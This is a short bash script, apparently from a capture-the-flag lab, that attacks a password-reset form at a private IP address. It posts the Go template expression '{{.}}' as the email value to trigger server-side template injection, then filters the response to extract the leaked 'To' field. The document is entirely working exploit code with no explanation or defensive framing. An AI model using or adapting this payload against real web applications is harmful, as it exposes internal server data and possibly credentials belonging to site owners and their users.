#!/bin/bash


curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'email={{.}}' http://10.10.11.113:8080/forgot/ | grep To | cut -d ':' -f2 | sed -e 's/^[ \t]*//'
